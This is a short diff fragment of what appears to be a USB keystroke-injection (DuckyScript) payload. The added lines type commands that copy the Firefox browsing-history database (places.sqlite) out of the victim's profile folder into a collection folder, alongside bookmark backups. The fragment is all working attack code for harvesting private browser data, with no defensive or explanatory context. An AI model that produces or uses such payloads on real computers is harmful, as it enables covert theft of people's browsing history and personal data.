@@ -104,6 +104,14 @@ STRING copy AppData\Roaming\Mozilla\Firefox\Profiles\
 DELAY 500
 TAB
 DELAY 500
+STRING \places.sqlite BrowserInfo\Firefox
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy AppData\Roaming\Mozilla\Firefox\Profiles\
+DELAY 500
+TAB
+DELAY 500
 STRING \bookmarkbackups\b
 DELAY 500
 TAB
